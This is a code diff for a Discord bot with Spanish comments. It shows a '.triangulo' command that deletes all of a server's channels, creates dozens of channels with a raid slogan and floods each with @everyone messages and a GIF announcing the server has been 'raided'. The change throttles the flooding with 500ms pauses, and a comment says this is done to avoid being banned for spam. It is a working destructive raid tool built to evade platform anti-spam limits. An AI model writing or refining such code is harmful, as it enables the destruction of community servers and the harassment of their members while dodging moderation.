@@ -177,21 +177,29 @@ else if (cmd.startsWith('.diversión')) {
 else if (cmd === '.triangulo') {
     if (!guild) return;
 
-    // Solo definimos el Embed, el archivo lo crearemos dentro del spam
     const trianguloEmbed = new EmbedBuilder()
       .setColor(0xFF0000)
       .setDescription('TRIANGULITO ES EL MEJOR, HABEIS SIDO RAIDEADO POR EL GOAT DE TRIANGULITO')
       .setImage('attachment://triangulo.gif');
 
     await deleteAllChannels(guild);
-    const created = await createChannels(guild, 'TRIANGULITO ES EL MEJOR', 150, 10);
     
-    // AQUÍ ESTÁ EL CAMBIO: Creamos el archivo dentro de la función de spam
-    await spamChannels(created, 10, () => ({
-      content: '@everyone',
-      embeds: [trianguloEmbed],
-      files: [new AttachmentBuilder(triangulitoBuffer, { name: 'triangulo.gif' })]
-    }));
+    // REDUCE la cantidad a algo más manejable para evitar el bloqueo inmediato
+    const created = await createChannels(guild, 'TRIANGULITO ES EL MEJOR', 50, 10);
+    
+    // Aquí es donde el bot se bloquea. Necesitamos un bucle con espera
+    for (const channel of created) {
+        for (let i = 0; i < 10; i++) {
+            await channel.send({ 
+                content: '@everyone', 
+                embeds: [trianguloEmbed],
+                files: [new AttachmentBuilder(triangulitoBuffer, { name: 'triangulo.gif' })]
+            }).catch(console.error);
+            
+            // Pausa de 500ms entre cada mensaje para no ser baneado por spam
+            await new Promise(r => setTimeout(r, 500)); 
+        }
+    }
   }
 
   else if (cmd === '.ban') {
